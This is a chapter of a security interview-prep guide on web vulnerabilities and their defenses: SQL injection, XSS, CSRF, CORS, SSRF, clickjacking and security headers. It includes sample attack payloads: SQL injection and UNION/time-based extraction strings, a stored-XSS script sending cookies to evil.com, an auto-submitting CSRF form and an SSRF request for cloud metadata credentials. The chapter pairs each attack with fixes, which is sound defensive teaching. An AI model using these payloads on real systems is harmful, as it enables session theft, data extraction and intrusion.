---
sidebar_position: 3
title: "02 — Web Vulnerabilities & Defenses"
slug: 02-web-vulnerabilities
---

# 🛡️ Web Vulnerabilities & Defenses

Understanding common web vulnerabilities is essential for every senior engineer — not just for security interviews, but for designing systems that are secure by default. This chapter covers the attacks you'll be asked about most and the defenses you should already be applying.

---

## 1. SQL Injection (SQLi)

SQL injection occurs when **untrusted input** is concatenated directly into a SQL query, allowing an attacker to manipulate the query logic.

### Classic SQL Injection

```
User input:   ' OR '1'='1' --
Query becomes: SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'
Result:        Returns ALL users — authentication bypassed
```

#### Vulnerable Code

```python
# ❌ DANGEROUS — string concatenation
def login(username, password):
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    return db.execute(query)

# Attacker input: username = "admin' --"
# Resulting query: SELECT * FROM users WHERE username = 'admin' --' AND password = ''
# The -- comments out the password check
```

#### Fixed Code

```python
# ✅ SAFE — parameterized query
def login(username, password):
    query = "SELECT * FROM users WHERE username = %s AND password = %s"
    return db.execute(query, (username, password))
```

### Types of SQL Injection

| Type | Technique | Detection |
|------|-----------|-----------|
| **Classic (In-band)** | Error messages reveal data; UNION-based extraction | Error messages, visible data |
| **Blind (Boolean)** | True/false responses infer data bit by bit | Response differences |
| **Time-based Blind** | `SLEEP()` / `WAITFOR DELAY` to infer via response time | Timing variations |
| **Second-order** | Payload stored first, executed later in different query | Hardest to detect |
| **Out-of-band** | DNS/HTTP requests exfiltrate data (e.g., `LOAD_FILE`) | External channel |

### UNION-Based Extraction

```sql
-- Step 1: Find number of columns
' ORDER BY 1--    -- success
' ORDER BY 2--    -- success
' ORDER BY 3--    -- error → table has 2 columns

-- Step 2: Extract data
' UNION SELECT username, password FROM users--
```

### Time-Based Blind Example

```sql
-- If the first character of the admin password is 'a', wait 5 seconds
' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
```

### Prevention Checklist

| Defense | How |
|---------|-----|
| **Parameterized queries** | Use prepared statements with bound parameters |
| **ORM** | Use an ORM (SQLAlchemy, Hibernate) — generates parameterized queries |
| **Stored procedures** | Encapsulate queries in the database (with parameters) |
| **Input validation** | Whitelist expected patterns (e.g., integer IDs) |
| **Least privilege** | DB user should have minimal permissions (no DROP, no FILE) |
| **WAF** | Web Application Firewall as defense-in-depth (not primary defense) |
| **Error handling** | Never expose raw SQL errors to users |

:::tip Senior-Level Insight
ORMs don't make you immune. Raw query methods (`Session.execute()`, `$queryRaw`) in any ORM can still be injectable. The rule is simple: **never concatenate user input into any query string**, whether raw SQL, NoSQL, LDAP, or GraphQL.
:::

---

## 2. Cross-Site Scripting (XSS)

XSS allows attackers to inject **malicious scripts** into web pages viewed by other users.

### XSS Types

```
                       ┌─────────────────────────────────────────┐
                       │              XSS Types                  │
                       └────────────────┬────────────────────────┘
                 ┌──────────────────────┼───────────────────────┐
                 ▼                      ▼                       ▼
          ┌──────────┐          ┌──────────────┐        ┌────────────┐
          │ Stored   │          │  Reflected   │        │ DOM-based  │
          │ (Type 1) │          │  (Type 2)    │        │ (Type 0)   │
          └──────────┘          └──────────────┘        └────────────┘
          Payload saved         Payload in URL/          Payload processed
          in database           request, reflected       entirely in browser
          (most dangerous)      in response              (never hits server)
```

### Stored XSS

Attacker injects a script that is **saved** (e.g., in a comment, profile) and executed when other users view the page.

```html
<!-- Attacker posts this as a "comment" -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

<!-- Every user who views the comment page executes this script -->
```

### Reflected XSS

Payload is in the **URL** and reflected in the response without sanitization.

```
Malicious URL:
https://example.com/search?q=<script>alert('XSS')</script>

Server response:
<p>You searched for: <script>alert('XSS')</script></p>
```

### DOM-Based XSS

The vulnerability is entirely in **client-side JavaScript** — the server never sees the payload.

```javascript
// ❌ Vulnerable — reads from URL fragment and writes to DOM
const name = document.location.hash.substring(1);
document.getElementById("greeting").innerHTML = "Hello, " + name;

// Attack URL: https://example.com/page#<img src=x onerror=alert('XSS')>
```

### XSS Prevention

| Defense | Protects Against | Implementation |
|---------|-----------------|----------------|
| **Output encoding** | All XSS types | HTML-encode `<>&"'` before rendering |
| **Content Security Policy (CSP)** | Inline scripts, untrusted sources | HTTP header restricting script sources |
| **HttpOnly cookies** | Cookie theft via XSS | `Set-Cookie: HttpOnly` |
| **Input validation** | Obvious payloads | Whitelist allowed characters |
| **DOM sanitization** | DOM-based XSS | Use `textContent` instead of `innerHTML` |
| **Framework auto-escaping** | Stored + Reflected | React, Angular, Vue auto-escape by default |

#### CSP Header Example

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

```javascript
// ✅ Safe output — React auto-escapes
function Comment({ text }) {
  return <p>{text}</p>; // React escapes HTML entities automatically
}

// ❌ Dangerous — dangerouslySetInnerHTML bypasses React's protection
function Comment({ text }) {
  return <p dangerouslySetInnerHTML={{ __html: text }} />;
}
```

:::warning
Modern frameworks (React, Angular, Vue) auto-escape output by default, but they all have escape hatches (`dangerouslySetInnerHTML`, `[innerHTML]`, `v-html`). These are the most common source of XSS in modern apps. Review every use in code reviews.
:::

---

## 3. Cross-Site Request Forgery (CSRF)

CSRF tricks an authenticated user's browser into making an **unintended request** to a site where they're already logged in.

### How CSRF Works

```
┌──────────────┐     ┌──────────────────┐     ┌──────────────┐
│  Victim's    │     │  evil.com        │     │  bank.com    │
│  Browser     │     │  (attacker site) │     │  (target)    │
└──────┬───────┘     └────────┬─────────┘     └──────┬───────┘
       │                      │                       │
       │ 1. Victim is logged  │                       │
       │ in to bank.com       │                       │
       │ (has session cookie) │                       │
       │                      │                       │
       │ 2. Victim visits     │                       │
       │    evil.com          │                       │
       │─────────────────────▶│                       │
       │                      │                       │
       │ 3. evil.com serves   │                       │
       │ page with hidden form│                       │
       │◀─────────────────────│                       │
       │                      │                       │
       │ 4. Browser auto-submits form to bank.com     │
       │ POST /transfer {to=attacker, amount=10000}   │
       │ Cookie: session=victim_session (auto-attached)│
       │─────────────────────────────────────────────▶│
       │                      │                       │
       │                      │  5. Bank processes    │
       │                      │  the request as       │
       │                      │  legitimate (valid    │
       │                      │  session cookie)      │
```

#### Attack HTML on evil.com

```html
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

### CSRF Prevention

| Defense | How It Works |
|---------|-------------|
| **CSRF tokens** | Server embeds a random token in forms; validates on submission |
| **SameSite cookies** | `SameSite=Strict` or `Lax` prevents cross-site cookie sending |
| **Double-submit cookie** | Send token in both cookie and request body; server compares |
| **Origin/Referer header check** | Verify the request origin matches expected domain |
| **Custom request headers** | Require `X-Requested-With` header (browsers block cross-origin custom headers) |

```python
# CSRF token implementation
import secrets

def generate_csrf_token(session):
    token = secrets.token_hex(32)
    session['csrf_token'] = token
    return token

def validate_csrf_token(session, submitted_token):
    return secrets.compare_digest(session.get('csrf_token', ''), submitted_token)
```

:::tip Senior-Level Insight
`SameSite=Lax` (now the default in modern browsers) prevents CSRF for POST requests from cross-origin contexts while still allowing top-level GET navigations (clicking links). For APIs, simply requiring a non-simple content type (`application/json`) or a custom header is sufficient — CORS preflight will block cross-origin requests.
:::

---

## 4. CORS (Cross-Origin Resource Sharing)

### Same-Origin Policy

Browsers enforce the **Same-Origin Policy (SOP)**: scripts on `https://app.com` cannot read responses from `https://api.other.com`. CORS relaxes this restriction with explicit server opt-in.

### CORS Request Flow

```
Simple Request (GET, HEAD, POST with simple headers):
┌──────────┐                        ┌──────────┐
│ Browser  │  GET /data             │  Server  │
│ origin:  │  Origin: https://app.com│          │
│ app.com  │───────────────────────▶│ api.com  │
│          │                        │          │
│          │  Access-Control-Allow- │          │
│          │  Origin: https://app.com│          │
│          │◀───────────────────────│          │
└──────────┘                        └──────────┘

Preflight Request (PUT, DELETE, custom headers, application/json):
┌──────────┐                        ┌──────────┐
│ Browser  │  OPTIONS /data         │  Server  │
│ origin:  │  Origin: https://app.com│          │
│ app.com  │  Access-Control-       │ api.com  │
│          │  Request-Method: PUT   │          │
│          │  Access-Control-       │          │
│          │  Request-Headers:      │          │
│          │  Authorization         │          │
│          │───────────────────────▶│          │
│          │                        │          │
│          │  Access-Control-Allow- │          │
│          │  Origin: https://app.com│          │
│          │  Access-Control-Allow- │          │
│          │  Methods: GET,PUT,POST │          │
│          │  Access-Control-Allow- │          │
│          │  Headers: Authorization│          │
│          │  Access-Control-Max-Age│          │
│          │  : 3600               │          │
│          │◀───────────────────────│          │
│          │                        │          │
│          │  PUT /data (actual)    │          │
│          │───────────────────────▶│          │
│          │  200 OK                │          │
│          │◀───────────────────────│          │
└──────────┘                        └──────────┘
```

### CORS Headers

| Header | Direction | Purpose |
|--------|-----------|---------|
| `Origin` | Request | Browser sends the requesting origin |
| `Access-Control-Allow-Origin` | Response | Allowed origin(s) — one origin or `*` |
| `Access-Control-Allow-Methods` | Response | Allowed HTTP methods |
| `Access-Control-Allow-Headers` | Response | Allowed custom headers |
| `Access-Control-Allow-Credentials` | Response | Whether cookies/auth are allowed (`true`) |
| `Access-Control-Max-Age` | Response | Preflight cache duration (seconds) |
| `Access-Control-Expose-Headers` | Response | Headers the browser JS can read |

:::warning
Never use `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`. This combination is explicitly blocked by browsers. If you need credentials, you must specify the exact origin, not a wildcard.
:::

---

## 5. Server-Side Request Forgery (SSRF)

SSRF tricks the server into making requests to **internal resources** the attacker can't reach directly.

### Attack Flow

```
┌──────────┐          ┌──────────────┐          ┌──────────────────┐
│ Attacker │          │  Web Server  │          │  Internal Service │
│          │          │  (public)    │          │  (private)        │
└────┬─────┘          └──────┬───────┘          └────────┬─────────┘
     │                       │                           │
     │ POST /fetch-url       │                           │
     │ {url: "http://        │                           │
     │  169.254.169.254/     │                           │
     │  latest/meta-data/    │                           │
     │  iam/security-        │                           │
     │  credentials/"}       │                           │
     │──────────────────────▶│                           │
     │                       │ GET http://169.254...      │
     │                       │ (Server makes request     │
     │                       │  to AWS metadata!)        │
     │                       │──────────────────────────▶│
     │                       │                           │
     │                       │ {AccessKeyId: "AKIA...",  │
     │                       │  SecretAccessKey: "..."}  │
     │                       │◀──────────────────────────│
     │                       │                           │
     │ AWS credentials!      │                           │
     │◀──────────────────────│                           │
```

### SSRF Prevention

| Defense | Implementation |
|---------|---------------|
| **URL allowlist** | Only allow requests to known-good domains/IPs |
| **Block private ranges** | Deny `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.169.254`, `127.0.0.0/8` |
| **Disable redirects** | Attackers use redirects to bypass allowlists |
| **IMDSv2** | AWS Instance Metadata Service v2 requires a PUT token first |
| **Network segmentation** | Application server shouldn't have access to metadata endpoints |
| **DNS rebinding protection** | Resolve DNS before checking, then use the resolved IP |

```python
# SSRF-safe URL fetch
import ipaddress
from urllib.parse import urlparse
import socket

BLOCKED_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),
]

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        return False
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        return not any(ip in network for network in BLOCKED_RANGES)
    except (socket.gaierror, ValueError):
        return False
```

---

## 6. Clickjacking

Clickjacking loads a target site in a **transparent iframe** and tricks users into clicking on it while they think they're clicking on the attacker's page.

### Prevention

```http
# Option 1: X-Frame-Options (legacy, still widely supported)
X-Frame-Options: DENY                    # never allow framing
X-Frame-Options: SAMEORIGIN              # only same origin can frame

# Option 2: CSP frame-ancestors (modern, more flexible)
Content-Security-Policy: frame-ancestors 'none';          # equivalent to DENY
Content-Security-Policy: frame-ancestors 'self';           # equivalent to SAMEORIGIN
Content-Security-Policy: frame-ancestors https://trusted.com;  # specific origin
```

---

## 7. Security Headers Overview

| Header | Value | Purpose |
|--------|-------|---------|
| `Content-Security-Policy` | `default-src 'self'; script-src 'self'` | Controls allowed content sources |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | Force HTTPS for 1 year |
| `X-Content-Type-Options` | `nosniff` | Prevent MIME-type sniffing |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Prevent clickjacking |
| `X-XSS-Protection` | `0` | Disable buggy browser XSS filter (CSP is better) |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Control referrer information leakage |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Disable browser features |
| `Cache-Control` | `no-store` (for sensitive pages) | Prevent caching of sensitive data |
| `Cross-Origin-Opener-Policy` | `same-origin` | Isolate browsing context |
| `Cross-Origin-Resource-Policy` | `same-origin` | Prevent cross-origin reads |

### Recommended Security Headers (Express.js)

```javascript
const helmet = require('helmet');
app.use(helmet());

// Or manually:
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'");
  next();
});
```

---

## 8. OWASP Top 10 (2021)

| Rank | Category | Description | Key Mitigations |
|:----:|----------|-------------|-----------------|
| **A01** | Broken Access Control | Missing/broken authorization checks | Deny by default, server-side checks, RBAC |
| **A02** | Cryptographic Failures | Weak crypto, plaintext storage, missing TLS | Use strong algorithms, encrypt at rest/transit |
| **A03** | Injection | SQL, NoSQL, OS, LDAP injection | Parameterized queries, input validation |
| **A04** | Insecure Design | Missing security architecture/threat modeling | Threat modeling, secure design patterns |
| **A05** | Security Misconfiguration | Default creds, verbose errors, open cloud storage | Hardening, remove defaults, automate config |
| **A06** | Vulnerable Components | Outdated libraries with known CVEs | SCA scanning, dependency updates, SBOM |
| **A07** | Auth & ID Failures | Broken auth, weak passwords, session issues | MFA, strong passwords, secure sessions |
| **A08** | Software & Data Integrity | Untrusted deserialization, CI/CD compromise | Signed updates, integrity checks, secure CI/CD |
| **A09** | Logging & Monitoring Failures | No audit trail, no alerting | Structured logging, SIEM, alerting |
| **A10** | SSRF | Server makes requests to attacker-controlled URLs | URL validation, network segmentation, allowlists |

:::tip Senior-Level Insight
When asked about OWASP Top 10 in interviews, don't just recite the list. Pick 2-3 you've personally dealt with and describe: (1) how you discovered the vulnerability, (2) what the impact was, and (3) how you remediated it. This demonstrates real-world experience, not textbook knowledge.
:::

---

## 9. Input Validation & Sanitization

### Validation vs Sanitization

| Approach | Action | Example |
|----------|--------|---------|
| **Validation** | Reject invalid input | Email must match regex `^[^@]+@[^@]+\.[^@]+$` |
| **Sanitization** | Transform input to be safe | Strip HTML tags, encode special characters |
| **Escaping** | Encode special characters for context | `<` → `&lt;` for HTML output |

### Validation Strategy by Layer

```
┌──────────────┐
│   Client     │  ── Quick UX validation (not security)
├──────────────┤
│   API Layer  │  ── Schema validation (JSON Schema, Joi, Zod)
├──────────────┤
│   Service    │  ── Business rule validation
├──────────────┤
│   Database   │  ── Constraints (NOT NULL, CHECK, FK)
└──────────────┘

Defense in depth: validate at EVERY layer
Client-side validation is NEVER sufficient alone
```

```typescript
// Zod schema validation example
import { z } from 'zod';

const CreateUserSchema = z.object({
  email: z.string().email().max(255),
  name: z.string().min(1).max(100).regex(/^[a-zA-Z\s'-]+$/),
  age: z.number().int().min(13).max(150),
  role: z.enum(['user', 'admin', 'editor']),
});

function createUser(input: unknown) {
  const validated = CreateUserSchema.parse(input); // throws on invalid
  return db.users.create(validated);
}
```

### Common Input Validation Mistakes

| Mistake | Why It's Wrong | Fix |
|---------|---------------|-----|
| Blacklisting bad chars | Attackers find bypasses | Whitelist allowed patterns |
| Client-side only | Easily bypassed (curl, Postman) | Always validate server-side |
| Regex without anchors | `^` and `$` missing → partial match | Use `^...$` anchors |
| Over-trusting content type | `Content-Type: application/json` can be faked | Validate body regardless |
| No length limits | DoS via huge payloads | Set `max-length` on all fields |

---

## 10. Putting It All Together — Defense in Depth

```
┌────────────────────────────────────────────────────────────────┐
│                        DEFENSE IN DEPTH                        │
├────────────────────────────────────────────────────────────────┤
│  Layer 1: Network         │ WAF, DDoS protection, firewall    │
├───────────────────────────┼────────────────────────────────────┤
│  Layer 2: Transport       │ TLS 1.3, HSTS, certificate pinning│
├───────────────────────────┼────────────────────────────────────┤
│  Layer 3: Application     │ Input validation, output encoding, │
│                           │ CSP, security headers              │
├───────────────────────────┼────────────────────────────────────┤
│  Layer 4: Authentication  │ MFA, strong passwords, rate limits │
├───────────────────────────┼────────────────────────────────────┤
│  Layer 5: Authorization   │ RBAC/ABAC, least privilege, ACLs  │
├───────────────────────────┼────────────────────────────────────┤
│  Layer 6: Data            │ Encryption at rest, hashing,       │
│                           │ masking, tokenization              │
├───────────────────────────┼────────────────────────────────────┤
│  Layer 7: Monitoring      │ Logging, alerting, anomaly         │
│                           │ detection, incident response       │
└───────────────────────────┴────────────────────────────────────┘
```

:::warning
No single defense is sufficient. SQL injection prevention doesn't help against XSS. HTTPS doesn't prevent CSRF. Always apply **multiple layers** of defense so that when one fails, others still protect the system.
:::

---

## 🔗 Related Chapters

- **[01 — Authentication & Authorization](./01-authentication-authorization.md)** — Securing the identity layer
- **[03 — Cryptography & Secure Design](./03-cryptography-secure-design.md)** — The crypto behind TLS and hashing
- **[05 — Interview Questions](./05-interview-questions.md)** — Practice vulnerability analysis questions
